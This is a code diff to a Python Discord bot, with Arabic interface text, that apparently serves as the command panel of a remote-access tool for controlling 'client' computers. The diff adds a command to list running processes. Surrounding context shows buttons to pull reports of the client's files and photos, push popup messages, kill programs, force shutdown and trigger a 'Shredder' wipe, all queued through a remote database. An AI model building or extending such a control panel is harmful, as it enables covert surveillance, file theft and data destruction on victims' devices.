@@ -325,11 +325,21 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Request files report for {self.code}"):
                 await interaction.followup.send("📸 تم طلب تقرير الملفات والصور، سيصلك الملف المرفق هنا خلال لحظات!", ephemeral=True)
 
+    @discord.ui.button(label="📋 فحص البرامج المفتوحة", style=discord.ButtonStyle.primary, custom_id="dev_act_procs", row=2)
+    async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_procs_check" not in db: db["remote_procs_check"] = {}
+            db["remote_procs_check"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Check running processes for {self.code}"):
+                await interaction.followup.send("📋 تم طلب قائمة البرامج النشطة، سيصلك ملف التقرير هنا خلال لحظات!", ephemeral=True)
+
     @discord.ui.button(label="💬 إرسال رسالة منبثقة", style=discord.ButtonStyle.primary, custom_id="dev_act_msg", row=2)
     async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SendMsgModal(self.code))
 
-    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=2)
+    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=3)
     async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -339,7 +349,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Kill background processes for {self.code}"):
                 await interaction.followup.send("🪟 تم إرسال أمر إغلاق جميع الألعاب والبرامج الخلفية للعميل بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=3)
+    @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -349,7 +359,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
                 await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري لجهاز العميل!", ephemeral=True)
 
-    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=3)
+    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=4)
     async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -406,7 +416,7 @@ class MainDashboardView(discord.ui.View):
                 return
 
             view = DevicesSubMenuView(devices_list)
-            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
+            await interaction.response.send_message("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ حدث خطأ غير متوقع: {str(e)}", ephemeral=True)
 
